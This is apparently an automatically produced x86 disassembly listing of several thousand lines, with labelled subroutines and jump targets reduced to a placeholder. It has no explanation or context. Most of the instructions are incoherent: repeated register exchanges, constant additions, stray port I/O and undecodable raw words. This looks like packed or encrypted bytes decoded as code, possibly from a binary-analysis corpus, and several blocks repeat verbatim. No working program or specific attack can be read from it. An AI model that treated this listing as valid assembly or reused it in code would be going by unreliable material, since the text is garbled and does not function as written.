adc eax 0x6ac69595
loope r-xdata
scasd [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0xde7cc3c6
lea edx [ ebp + 0x5050595 ]
xchg ebp eax
xchg ebp eax
add eax 0x1c050505
adc ebp [ ebp - 0x6b ]
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg ebp eax
0x95959312 0x6a95
out 0xd5 al
push 0xffffffc3
les ebp [ 0xfffffffff1959595 ]
push ds
xchg esp eax
push ds
aad 0x99
push ds
aad 0x99
push ds
lea edi [ ebp + ebp - 0x24 ]
xchg ebp eax
add eax 0xf36b1e05
sbb al 0xe8
outsd
jl r-xdata
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
xchg ebp eax
push ds
aad 0x8d
sbb al 0x91
mov cl 0x1e
xchg ecx eax
mov cl 0x7c
loopne r-xdata
xchg edi eax
xchg ebp eax
xchg ebp eax
add eax 0x55655a6
add eax 0xff050505
sti
jl r-xdata
push ebx
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
add eax 0x1ec2c305
call [ gs : ebp + 0x7cedc36a ]
in al dx
salc
xchg ebp eax
xchg ebp eax
add eax 0xf27cc005
stosd [ edi ]
xchg ebp eax
xchg ebp eax
0x959e5811 0x1e95
shl [ ecx - 0x73a5837b ] 0x95
xchg ebp eax
add eax 0xef7cc205
mov cl 0x95
xchg ebp eax
push ss
call 0x19e35bab
std
mov cl 0x95
xchg ebp eax
push ds
fst [ ecx + 0x169c229a ]
insb
movsb [ edi ] [ esi ]
jl r-xdata
mov [ ebp + 0x5050595 ] dl
add eax 0x1a7c931c
mov [ ebp + 0x5050595 ] dl
popfd
cmpsb [ esi ] [ edi ]
push 0x7c
xor al 0xbb
xchg ebp eax
xchg ebp eax
adc [ ebp - 0x66 ] dl
adc edi esp
xchg ebp eax
xchg ebp eax
add eax 0x747c5696
xchg ebp eax
jl r-xdata
test eax 0x4d1e9595
push ss
outsb
push 0xffffff9a
adc [ ebx - 0x596a6a4b ] cl
push ebp
jl r-xdata
add eax 0x8ef87cc0
xchg ebp eax
xchg ebp eax
sbb al bl
dec ecx
xchg esi eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
0x959b6511 0xc695
jl r-xdata
int 0x95
xchg ebp eax
jl r-xdata
jge r-xdata
lodsd [ esi ]
xchg ebp eax
xchg ebp eax
add eax 0x7cc00505
clc
mov ss [ ebp + 0x49d81895 ]
push ss
push edi
xchg edi eax
jl r-xdata
lahf
xchg ebp eax
xchg ebp eax
jl r-xdata
jl r-xdata
aam 0x95
xchg ebp eax
add eax 0x36a0505
sbb [ ebp + 0x55109595 ] edx
jl r-xdata
xchg ebx eax
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x6a69e06a
loopne r-xdata
sahf
xchg ebp eax
xchg ebp eax
jl r-xdata
cdq
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x1cf3f1ff
shl ch 0xcf
push edi
sbb al 0xc0
test edi 0xf1c01cf3
push edx
iretd
test [ ebp + 0x56960595 ] edx
jl r-xdata
adc [ ebp - 0x66 ] dl
adc [ ebx + edx * 4 ] esp
xchg esi eax
xchg ebp eax
xchg ebp eax
add eax 0x95417cc2
xchg ebp eax
xchg ebp eax
add eax 0x52050505
shr [ ecx - 0x7 ] 0x1
out 0xb7 al
xchg ebp eax
push 0x3
sub eax 0x7c959595
inc edi
test eax 0x10059595
push 0xffffff9a
adc al bl
cmpsb [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
lds edi [ esp + edx * 8 - 0x5a ]
xchg ebp eax
xchg ebp eax
add eax 0x87f87d05
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg ebp eax
xchg ebp eax
add eax 0x109a6a10
fsub [ esi + 0x7cc59595 ]
aam 0xa6
jl r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x565c0505
add eax 0x5050505
add eax 0x95a595fd
mov bh 0x95
xchg ebp eax
0x95bc4b11 0x7c95
js r-xdata
sbb al 0xc0
cmc
iretd
les edx [ ebp + 0x5050595 ]
add eax 0x7a7d0505
retn
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg ebx eax
int 0x95
xchg ebp eax
add eax 0x96050505
push ebp
push 0xffffffe0
imul ebp [ edx - 0x20 ] 0xaff87c71
xchg ebp eax
xchg ebp eax
adc [ edx + ebx * 4 + 0x11 ] bl
push edi
xchg ebx eax
xchg ebp eax
xchg ebp eax
retn
scasd [ edi ]
sub_48d0d2
fcomp st0
jge r-xdata
xchg ebp eax
add eax 0x5050505
jl r-xdata
mov al [ 0xffffffff8b7c9595 ]
ficom [ ebp + 0x387cc095 ]
rcl [ ebp + 0x5050595 ] 0x1
add eax 0x98647c05
add eax 0x505565c
add eax 0x69d05205
int1
stc
stc
xchg ebp eax
push 0xffffffc5
in eax dx
jl r-xdata
xchg ebp eax
xchg ebp eax
add eax 0xe7c5b1e
mov al [ 0x1cf39595 ]
shl [ ecx - 0x6b00322b ] 0x1
sbb al 0xd1
mov cl 0xd7
cmpsb [ esi ] [ edi ]
push ebp
jl r-xdata
cwde
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg ecx eax
xchg ebp eax
xchg ebp eax
push ds
push 0x487c6a6a
mov bl 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x6a6cfa7d
push 0x1e
adc ebp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ds
sbb edx [ ebp - 0x6b ]
xchg ebp eax
xchg ebp eax
cld
push ebp
adc [ ebp - 0x2e836a6b ] edx
mov ah 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x977d1605
adc [ ebp + 0x7c ] dl
mov [ 0xffffffffffff9595 ] al
add eax 0x5050505
add eax 0x9a65ae05
pop ss
ffreep st5
xchg ebp eax
xchg ebp eax
0x56cb
int 0xb1
push ds
in eax 0xb5
push ds
aad 0x8d
xchg esi eax
insb
xchg esi eax
dec esp
xchg esi eax
sbb al 0xd0
insd
adc [ ebp - 0x66 ] dl
adc dl al
mov cl 0x95
xchg ebp eax
cmpsb [ esi ] [ edi ]
push ebp
0x7ccb
les edx [ ebp + 0x5050595 ]
int3
sub_48d163
xchg ebp eax
xchg ebp eax
add eax 0x8db1e16a
push ds
push ebx
jge r-xdata
add eax 0x10180505
bound ebp [ edx + 0x6a ]
jl r-xdata
add eax 0x5050505
add eax 0x90109a05
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ebx
shl [ ecx + 0x229a9785 ] 0x1
salc
shl ebx 0x1
adc [ ebp - 0x66 ] dl
adc [ esi ] esi
mov ch 0x95
xchg ebp eax
jl r-xdata
sahf
xchg ebp eax
xchg ebp eax
add eax 0x10180505
pop ebp
push 0x6ac56a6a
retn
sbb [ eax ] bl
pop ebp
push 0x487c6a6a
mov bl 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x6a6cfa7d
push 0x1e
adc ebp [ ecx ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ds
sbb edx [ ebp - 0x6b ]
cwde
xchg ebp eax
xchg ebp eax
push 0xffffffc3
loope r-xdata
int 0xf3
sbb al 0xd0
imul esp [ esi - 0x7d2983ab ] 0x1ec09595
jns r-xdata
adc [ ebp - 0x7bdd656b ] 0x7c
inc ebp
mov bl 0x95
xchg ebp eax
xchg ebp eax
xchg ebp eax
cld
push ebp
adc [ ebp - 0x2e836a6b ] edx
mov ah 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x977d1605
adc [ ebp + 0x7c ] dl
mov [ 0xffffffffffff9595 ] al
add eax 0x5050505
add eax 0x9a65ae05
pop ss
ffreep st5
xchg ebp eax
xchg ebp eax
0x56cb
push ebp
xchg ebp eax
0x595958e 0x505
add eax 0x1e89c26a
fstp [ ebp - 0x6a4e0e84 ]
xchg ebp eax
add eax 0xf47c531e
mov bl 0x95
xchg ebp eax
jl r-xdata
xchg ebp eax
movsd [ edi ] [ esi ]
xchg ebp eax
xchg ebp eax
std
xchg ebp eax
xchg esp eax
xchg ebp eax
xchg ebp eax
call [ ebp - 0x6a79ce84 ]
xchg ebp eax
add eax 0x6ac6c505
retn
jns r-xdata
xchg ebp eax
xchg ebp eax
inc ecx
push 0xa57d6a6a
xchg ecx eax
xchg ebp eax
xchg ebp eax
sbb al al
dec ecx
jl r-xdata
mov cl 0x95
xchg ebp eax
add eax 0x5050505
sbb [ eax ] dl
int3
sub_48d28e
rcl [ ebp - 0x5582fa6b ] cl
insd
push 0x6a
jl r-xdata
jl r-xdata
pushfd
xchg ebp eax
xchg ebp eax
call [ ecx - 0x6a5a6a03 ]
xchg ebp eax
std
xchg ebp eax
xchg esp eax
xchg ebp eax
xchg ebp eax
call [ ebp - 0x6a79ce84 ]
xchg ebp eax
add eax 0x6ac6c505
retn
scasb [ edi ]
push esi
jl r-xdata
mov al [ 0x5059595 ]
push ss
push ecx
test [ esp + edx * 2 - 0x51 ] edi
xchg ebp eax
xchg ebp eax
add eax 0xbc01cf3
sbb al 0xd0
aas
push ds
inc ebx
cmpsb [ esi ] [ edi ]
push ebp
jmp ecx
std
push 0xffffff95
xchg ebp eax
mov ah 0x95
xchg ebp eax
adc [ ebp + 0x7c ] dl
xor eax 0x5959582
push ds
aad 0x6d
jl r-xdata
cwde
xchg ebp eax
xchg ebp eax
add eax 0x958595fd
xchg ebp eax
and edx edx
xchg ecx eax
push 0xffffffd1
mov cl 0x8d
lodsb [ esi ]
shl [ ecx - 0x78e86573 ] 0x1
adc [ ebp - 0x29dd656b ] 0x5510f389
0x959d6b11 0x1e95
insd
xchg esi eax
outsb
0x959d6111 0x1695
jmp 0xffffffff9add5d73
mov bh 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x6310651e
0x9595ec11 0xfd95
js r-xdata
xchg ebp eax
retn 0x7cc5
test [ ebx ] 0xc3
jl r-xdata
xchg ebp eax
mov bl 0x7d
dec edi
mov eax [ 0x51169595 ]
cdq
jl r-xdata
mov ss [ ebp + 0x5050595 ]
add eax 0x881d7cc3
xchg ebp eax
xchg ebp eax
call [ ebp - 0x724e1e96 ]
push 0xffffffc3
loope r-xdata
rcl [ ebp - 0x2d32826b ] 0x1
xchg ebp eax
xchg ebp eax
jl r-xdata
rcl [ ebp + 0x67cc095 ] 0x1
mov ch 0x95
xchg ebp eax
add eax 0x15036ac6
xchg ebp eax
xchg ebp eax
xchg ebp eax
sbb al 0xd1
mov cl 0x85
sub_48d5d2
xchg ebp eax
add eax 0x86de7cc3
xchg ebp eax
xchg ebp eax
0x807c8422 0x95a9
xchg ebp eax
sar [ eax + ecx * 4 - 0x59 ] 0x95
xchg ebp eax
add eax 0x16050505
push ecx
cdq
lodsb [ esi ]
leave
mov cl 0x81
0x95841911 0xfd95
or eax 0x7c9595af
0x5959584 0x505
sub_48d750
test eax 0x5059595
add eax 0x5050505
add eax 0xfd97ff05
xchg ebp eax
xchg ebp eax
xchg ebp eax
aad 0x6a
loopne r-xdata
jl r-xdata
jl r-xdata
sbb al 0x81
movsb [ edi ] [ esi ]
sbb al 0xe1
movsd [ edi ] [ esi ]
cdq
jl r-xdata
arpl [ edx + 0x6a ] bp
add eax 0x5050505
add eax 0x685d1018
push 0x6a
jl r-xdata
mov ah 0x95
xchg ebp eax
int3
mov [ 0xfffffffffd059595 ] eax
cmp ah [ ecx + 0x1cc206c5 ]
shl [ ebp - 0x6a6cbe83 ] cl
xchg ebp eax
std
adc al 0xee
test al 0xb6
retn 0xd17c
jl r-xdata
mov [ ebp - 0xfafa6b ] ss
xchg ebp eax
push 0x3
cmp [ ebp + 0x7cca9595 ] edx
xchg ebx eax
adc [ ebp - 0xcb2e16b ] 0x1c
enter 0x1ed9 0x4c
xchg ebp eax
xchg ebp eax
add eax 0x36a0505
add [ ebp - 0x2fe36a6b ] edx
imul edx [ eax ] 0xd2119a55
fcom [ ebp - 0x47ef836b ]
cmpsd [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0xc265e06a
jl r-xdata
test al 0x95
xchg ebp eax
add eax 0x6a050505
loopne r-xdata
mov esp 0x5059595
push edx
shl [ ecx - 0x49 ] 0x1
mov al 0xf9
out 0x7c al
pop esi
push 0x5
push ss
push ecx
lds ebx [ eax ]
rcl [ ebp - 0x3b ] 0x1
bound ebp [ edx + 0x6a ]
add eax 0x18c55116
xchg ebp eax
xchg ebp eax
add eax 0x18050505
fst [ edi - 0x16faa02 ]
pop esp
nop
das
push 0xffffff80
xchg ebp eax
xchg ebp eax
push 0x2
popad
xchg ebp eax
xchg ebp eax
xchg ebp eax
0xcecb
sub_48db09
int1
jl r-xdata
retn 0x2b1c
mov dl 0x95
xchg ebp eax
add eax 0xc5050505
cmpsb [ esi ] [ edi ]
arpl bx ax
jl r-xdata
xchg esi eax
xchg ebp eax
xchg ebp eax
std
mov esp 0x46059595
outsb
push ss
push ebx
popfd
xlat
sbb eax 0x7c3680c9
or edx esp
xchg ebp eax
xchg ebp eax
add eax 0xd1d31c05
jge r-xdata
xchg ebp eax
std
in al dx
mov ebx 0x1cc20156
shr [ ecx - 0x6a691583 ] cl
xchg ebp eax
std
and al 0x9d
xchg ecx eax
xchg esi eax
xchg ebp eax
xchg ebp eax
push ss
push ecx
aad 0x7c
mov ebx 0x56a6a69
add eax 0xfd050505
mov edx 0xc60b70cc
sbb al 0xb
inc ebp
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
push 0x5056a6a
add eax 0x5050505
cmpsb [ esi ] [ edi ]
push ebp

sub_48db8d
aam 0xa9
xchg ebp eax
xchg ebp eax
add eax 0x5050505
push 0xffffffe0
jno r-xdata
outsd
push 0x6a
jl r-xdata
dec ecx
lea edx [ ebp + 0x5050595 ]
push esp
jpe r-xdata
add eax 0xd97cc205
cmpsd [ esi ] [ edi ]
xchg ebp eax
popfd
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
jl r-xdata
imul ebp [ edx + 0x6a ] 0x5050505
add eax 0x70ccbafd
or eax esi
sbb al 0xb
inc ebp
xchg ebp eax
xchg ebp eax
xchg ebp eax
jl r-xdata
xchg esi eax
pop edx
jl r-xdata
inc eax
push 0x6a
add eax 0x65d81cf3
int3
mov ecx 0x5059595
add eax 0x6d160505
xchg esp eax
push 0x5056a6a
add eax 0x5050505
cmpsb [ esi ] [ edi ]
push ebp

push 0x7c
stosd [ edi ]
push 0x6a
add eax 0x5050505
add eax 0x5cd555a6
push esi
add eax 0x5050505
add eax 0x104d1e05
dec esi
0x95d1d211 0x7c95
xchg ebp eax
add eax 0x9595517c
xchg ebp eax
add eax 0x5050505
retn
push 0x6a
add eax 0x797d0505
push 0x6a
int3
xchg ebp eax
xchg ebp eax
std
iretd
xchg ebp eax
xchg ebp eax
add eax 0x565c0505
add eax 0x5050505
push ds
jl r-xdata
rcl [ ebp + 0x1e050595 ] 0x1
push ebx
jge r-xdata
jge r-xdata
insd
push 0x6a
jl r-xdata
0x6a6f3311 0xb46a
leave
mov cl 0x85
sbb cl dl
mov cl 0x85
jl r-xdata
arpl [ edx + 0x6a ] bp
add eax 0x5dbed405
retn 0xe91e
sub_48dc0e
sbb [ eax ] dl
inc ebp
push 0xab7c6a6a
outsd
push 0x6a
jl r-xdata
add eax 0xd97cc205
cmpsd [ esi ] [ edi ]
xchg ebp eax
popfd
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
jl r-xdata
inc eax
push 0x6a
add eax 0x65d81cf3
int3
mov ecx 0x5059595
add eax 0x6d160505
xchg esp eax
0x6a6f3311 0xb46a
leave
mov cl 0x85
sbb cl dl
mov cl 0x85
jl r-xdata
xchg ebp eax
add eax 0x9595517c
xchg ebp eax
add eax 0x5050505
retn
push 0x6a
add eax 0x797d0505
push 0x6a
int3
sub_48dfc6
push ds
dec ebp
sbb al 0xc8
int 0x7c
or [ ebx - 0x44006a6b ] 0x7c
sbb [ ebx + 0x55a69595 ] ebp
jl r-xdata
xchg ebp eax
xlat
xchg ebp eax
xchg ebp eax
add eax 0x229a0505
xchg ecx eax
salc
push ds
xchg ecx eax
adc dl [ esi - 0x5f836230 ]
push 0x6a
add eax 0xfbffcd05
sbb al 0xd0
inc ecx
jl r-xdata
add eax 0x8db1d96a
jl r-xdata
mov al [ 0x18059595 ]
adc [ 0x7d6a6a68 ] dl
pop edx
pushad
push 0x6a
jl r-xdata
jns r-xdata
test eax 0x5059595
add eax 0x81b1e91c
retn
jno r-xdata
insd
push 0x6a
add eax 0x6a6bde7d
push 0xffffffcc
int3
aaa
sbb al 0xc8
imul ebx [ eax + ebx * 8 ] 0x61c01c6d
push ds
shr [ ecx + 0x1c ] 0x1
sar [ ebp + 0x1e ] 0x1
shr [ ebp + 0x7c ] 0x1
lodsd [ esi ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
add eax 0xcecb0505
pop esp
push esi
add eax 0x5050505
push edx
sar [ ecx - 0x28 ] 0x1
faddp st3
fcom [ edx - 0x30 ]
inc ecx
int 0xf0
sti
retn
push 0x6a
add eax 0x79d01c05
push ds
shl [ ecx + 0x1c ] 0x1
shl [ ebp - 0x5a ] 0x1
push ebp
cmpsb [ esi ] [ edi ]
inc edi
sbb al 0xd0
imul ebx [ esi ] 0xe91e69d8
sbb [ ebp - 0x5a ] bh
arpl [ esi ] bx
pop ebx
push ds
dec edx
inc esi
outsb
push ss
push ebx
popfd
xlat
jl r-xdata
mov ebx 0x59595ae
push 0x3
and eax 0xc6959595
retn 0xbc7c
fcomp st6
retn
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x7cc40505
mov edi 0x9a95959f
adc [ edi ] ebp
adc [ ebp - 0x472e836b ] 0x95
xchg ebp eax
add eax 0xc01cf305
pop ebx
sbb al 0xd0
inc ebx
sbb al 0xd8
popad
push eax
jl r-xdata
ror [ eax - 0x4a93e9af ] 0x9a
cmpsd [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0xc36a0505
popfd
jl r-xdata
add eax 0xb7c0505
xchg edi eax
xchg [ ebp + 0x1ec00595 ] edx
jns r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x7c5d1e05
outsb
nop
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x89727d05
xchg ebp eax
xchg ebp eax
lds ebx [ eax ]
shr [ edx - 0x3b ] 0x1
sbb [ eax ] dl
inc ecx
push 0x317c6a6a
mov eax 0x251e9595
sub [ ebp + 0x4ea69595 ] edx
retn 0x6310
xchg ebp eax
0x95bcb410 0x1895
ror cl 0x1
lds ebx [ esi ]
push ebx
jge r-xdata
mov ch 0x95
xchg ebp eax
stosb [ edi ]
cmp [ esi + 0x6a ] ch
push 0x5
add eax 0x1ec00505
jns r-xdata
pop ss
sbb [ ebx + 0x16d29595 ] 0x6a
xchg esi eax
add eax 0x7c6dd01e
xchg edi eax
imul ebp [ edx + 0x6a ] 0x5188c11d
push ss
insb
mov ch 0x9a
jb r-xdata
stosd [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
sbb al 0xd0
arpl bp cx
adc [ ebp + 0x277cce95 ] 0x7b
push 0x6a
sbb eax 0x7cd59481
retn 0x95a7
0x958f4017 0x1d95
rol [ ebp + 0x7c ] 0x1
[ eax + 0x5059595 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
push ds
pop ebp
jl r-xdata
xchg ebp eax
rcl [ esi ] cl
push 0xffffff96
sbb [ eax ] bl
pop ebp
push 0x297d6a6a
stosd [ edi ]
xchg ebp eax
xchg ebp eax
jl r-xdata
push esp
push ds
insb
push 0xffffffcc
adc [ ebp + 0x7c ] dl
popfd
mov esp 0x5059595
add eax 0x1e050505
push esi
jl r-xdata
push ebx
sbb al 0xd0
insd
int 0xff
mov ebx 0x6a7a3e7c
push 0x5
add eax 0x5050505
add eax 0xcecb55a6
pop esp
push esi
add eax 0x5050505
add eax 0xc6050505
mov dl 0x95
xchg ebp eax
into
pop esp
push esi
add eax 0x1cf30505
enter 0x7c6d 0x88
aam 0x95
xchg ebp eax
add eax 0xc0050505
push ds
jns r-xdata
add eax 0x565c55a6
add eax 0x7cc50505
xchg ecx eax
scasb [ edi ]
xchg ebp eax
xchg ebp eax
push 0xffffffc3
mov ebp 0x685d1018
push 0x6a
lds ebp [ edx - 0x3d ]
int1
cmpsb [ esi ] [ edi ]
pop esp
stosd [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x56d555a6
add eax 0x5050505
add eax 0x27c81cf3
jl r-xdata
jl r-xdata
jns r-xdata
test [ edx + 0x6a ] esi
xchg ebp eax
xchg ebp eax
add eax 0x7c5c1005
sub eax 0xf3959582
sbb al 0xd0
jl r-xdata
mov al 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x970b7c05
cmpsd [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0xd01cf305
inc ebp
jl r-xdata
popad
push 0x6a
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x6c ] dl
jl r-xdata
add eax 0x5050505
add eax 0x1cf34f1e
enter 0xce69 0xf3
sbb [ eax ] dl
jmp 0xffffffffc5b34db3
adc [ ebp + 0x5050595 ] 0x5
add eax 0x6ac50505
loopne r-xdata
jl r-xdata
mov [ 0x52059595 ] eax
sar [ ecx - 0xa ] 0x1
cli
in eax 0xec
push edx
shl [ ebp - 0x4b ] 0x1
mov edx 0x8f7cb5f7
jl r-xdata
sbb al 0xc8
imul edi [ esp - 0x72 ] 0xffffff95
xchg ebp eax
add eax 0xd0180505
push ebp
jl r-xdata
lahf
xchg ebp eax
xchg ebp eax
add eax 0x7c85ff05
dec esi
pushad
push 0x6a
add eax 0x5050505
add eax 0x90bd7d05
xchg ebp eax
xchg ebp eax
int3
sub_48e099
push ds
insd
jl r-xdata
push 0x6a
add eax 0x8db1d96a
jl r-xdata
adc [ ebp + 0x1c050595 ] 0xd0
imul ebx [ eax + edx * 8 ] 0x61d01c6d
sub eax 0xd5959595
0x69c81c37 0xd81c
insd
sbb al 0xc0
popad
jns r-xdata
test eax 0x5059595
add eax 0x81b1e91c
retn
push ds
shr [ ecx + 0x1c ] 0x1
sar [ ebp + 0x1e ] 0x1
shr [ ebp + 0x7c ] 0x1
lodsd [ esi ]
xchg ebp eax
xchg ebp eax
xchg ebp eax
add eax 0xcecb0505
pop esp
push esi
add eax 0x5050505
push edx
sar [ ecx - 0x28 ] 0x1
aaa
sbb al 0xc8
imul ebx [ eax + ebx * 8 ] 0x61c01c6d
faddp st3
fcom [ edx - 0x30 ]
inc ecx
int 0xf0
sti
retn
sub_48e0e7
push 0x5
add eax 0xe36a0505
lds edi [ ecx + ebx * 4 + 0x68 ]
push 0x6a
add eax 0xe36a0505
lds edi [ esp + 0x66 ]
push 0x6a
add eax 0x79d01c05
push ds
shl [ ecx + 0x1c ] 0x1
shl [ ebp - 0x5a ] 0x1
push ebp
cmpsb [ esi ] [ edi ]
inc edi
sbb al 0xd0
imul ebx [ esi ] 0xe91e69d8
sbb [ ebp - 0x5a ] bh
arpl [ esi ] bx
pop ebx
push ds
dec edx
inc esi
outsb
push ss
push ebx
popfd
xlat
jl r-xdata
fcomp st6
retn
xchg ecx eax
xchg ebp eax
xchg ebp eax
add eax 0x7cc40505
mov edi 0x9a95959f
adc [ edi ] ebp
adc [ ebp - 0x472e836b ] 0x95
xchg ebp eax
add eax 0xc01cf305
pop ebx
sbb al 0xd0
inc ebx
sbb al 0xd8
popad
push eax
jl r-xdata
ror [ eax - 0x4a93e9af ] 0x9a
cmpsd [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0xc36a0505
popfd
jl r-xdata
add eax 0xb7c0505
xchg edi eax
xchg [ ebp + 0x1ec00595 ] edx
jns r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x7c5d1e05
outsb
nop
xchg ebp eax
xchg ebp eax
add eax 0x5050505
add eax 0x89727d05
xchg ebp eax
xchg ebp eax
lds ebx [ eax ]
shr [ edx - 0x3b ] 0x1
sbb [ eax ] dl
inc ecx
push 0x317c6a6a
mov eax 0x251e9595
sub [ ebp + 0x4ea69595 ] edx
retn 0x6310
xchg ebp eax
0x95bcb410 0x1895
ror cl 0x1
lds ebx [ esi ]
push ebx
jge r-xdata
mov ch 0x95
xchg ebp eax
stosb [ edi ]
cmp [ esi + 0x6a ] ch
push 0x5
add eax 0x1ec00505
jns r-xdata
pop ss
sbb [ ebx + 0x16d29595 ] 0x6a
xchg esi eax
add eax 0x7c6dd01e
xchg edi eax
imul ebp [ edx + 0x6a ] 0x5188c11d
push ss
insb
mov ch 0x9a
jb r-xdata
stosd [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x5050505
sbb al 0xd0
arpl bp cx
adc [ ebp + 0x277cce95 ] 0x7b
push 0x6a
sbb eax 0x7cd59481
retn 0x95a7
0x958f4017 0x1d95
rol [ ebp + 0x7c ] 0x1
[ eax + 0x5059595 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
push ds
pop ebp
jl r-xdata
xchg ebp eax
rcl [ esi ] cl
push 0xffffff96
sbb [ eax ] bl
pop ebp
push 0x297d6a6a
stosd [ edi ]
xchg ebp eax
xchg ebp eax
jl r-xdata
push esp
push ds
insb
push 0xffffffcc
adc [ ebp + 0x7c ] dl
popfd
mov esp 0x5059595
add eax 0x1e050505
push esi
jl r-xdata
push ebx
sbb al 0xd0
insd
int 0xff
mov ebx 0x6a7a3e7c
push 0x5
add eax 0x5050505
add eax 0xcecb55a6
pop esp
push esi
add eax 0x5050505
add eax 0xc6050505
mov dl 0x95
xchg ebp eax
into
pop esp
push esi
add eax 0x1cf30505
enter 0x7c6d 0x88
aam 0x95
xchg ebp eax
add eax 0xc0050505
push ds
jns r-xdata
add eax 0x565c55a6
add eax 0x7cc50505
xchg ecx eax
scasb [ edi ]
xchg ebp eax
xchg ebp eax
push 0xffffffc3
mov ebp 0x685d1018
push 0x6a
lds ebp [ edx - 0x3d ]
int1
cmpsb [ esi ] [ edi ]
pop esp
stosd [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0x56d555a6
add eax 0x5050505
add eax 0x27c81cf3
jl r-xdata
jl r-xdata
jns r-xdata
test [ edx + 0x6a ] esi
xchg ebp eax
xchg ebp eax
add eax 0x7c5c1005
sub eax 0xf3959582
sbb al 0xd0
jl r-xdata
mov al 0x95
xchg ebp eax
add eax 0x5050505
add eax 0x970b7c05
cmpsd [ esi ] [ edi ]
xchg ebp eax
xchg ebp eax
add eax 0xd01cf305
inc ebp
jl r-xdata
popad
push 0x6a
push ss
insd
push 0xffffff9a
add [ esi + ebx + 0x6c ] dl
jl r-xdata
add eax 0x5050505
add eax 0x1cf34f1e
enter 0xce69 0xf3
sbb [ eax ] dl
jmp 0xffffffffc5b34db3
adc [ ebp + 0x5050595 ] 0x5
add eax 0x6ac50505
loopne r-xdata
jl r-xdata
mov [ 0x52059595 ] eax
sar [ ecx - 0xa ] 0x1
cli
in eax 0xec
push edx
shl [ ebp - 0x4b ] 0x1
mov edx 0x8f7cb5f7
jl r-xdata
sbb al 0xc8
imul edi [ esp - 0x72 ] 0xffffff95
xchg ebp eax
add eax 0xd0180505
push ebp
jl r-xdata
lahf
xchg ebp eax
xchg ebp eax
add eax 0x7c85ff05
dec esi
pushad
push 0x6a
add eax 0x5050505
add eax 0x90bd7d05
xchg ebp eax
xchg ebp eax
int3
sub_48e34d
outsd
push 0x6a
add eax 0xf1ff0505
int 0x7c
test eax 0x59595a3
add eax 0x5050505
bound ecx [ ebp + 0x7c ]
rcr [ edi + 0x5059595 ] 0xff
test [ esi + ecx * 2 + 0x60 ] edi
push 0x6a
add eax 0x5050505
add eax 0x90bd7d05
xchg ebp eax
xchg ebp eax
int3
sub_48e4bb
push 0x3
cmp [ ebp + 0x6afd9595 ] edx
xchg ebp eax
xchg ebp eax
xchg ebp eax
mov bl 0x7d
xor [ esi - 0x70836a6b ] 0x56a6a64
add eax 0x5050505
sbb al dl
and eax 0x6a7dc5c3
mov bh 0x95
xchg ebp eax
retn
sub_48e8f1
adc [ edi ] ch
push 0x6a
jl r-xdata
outsb
0x6a6c3111 0xac6a
enter 0x9a9d 0x11
push cs
insb
push 0x6a
lodsb [ esi ]
enter 0x7c99 0xf5
cwde
xchg ebp eax
xchg ebp eax
add eax 0x6a050505
jecxz r-xdata
outsd
push 0x6a
add eax 0x791ec005
push ss
jno r-xdata
cmp al 0xbf
xchg ebp eax
xchg ebp eax
add eax 0x457d0505
lea edx [ ebp - 0x4503836b ]
xchg ebp eax
xchg ebp eax
jl r-xdata
jl r-xdata
call 0x672c65d4
push 0x6a
sbb al 0xe8
push ds
imul esi ebx 0x1c
call 0xffffffffbac465eb
xchg ebp eax
xchg ebp eax
adc al 0x79
add [ ecx + 0x3c7c9595 ] edx
mov edi 0x5059595
add eax 0x958d457d
xchg ebp eax
jl r-xdata
add eax 0x8d457d05
nop
xchg ebp eax
xchg ebp eax
add eax 0x5050505
scasb [ edi ]
add eax 0x1ecde66a
push ebx
retn 0xb67d
push 0x95ff6a6a
jl r-xdata
xchg ebp eax
mov edx 0xf27c9595
xchg ebp eax
xchg ebp eax
add eax 0x119a0505
sahf
xchg ebp eax
xchg ebp eax
xchg ebp eax
push ss
jmp 0xffffffff9ade6aa2
mov dh 0x95
xchg ebp eax
add eax 0x5ccc0505
push esi
retn
sub_48eb12
push esi
add eax 0x69d01c05
push ds
shr [ ecx + 0x7c ] 0x1
jae r-xdata
sbb [ ecx - 0x6588e96c ] al
pop ds
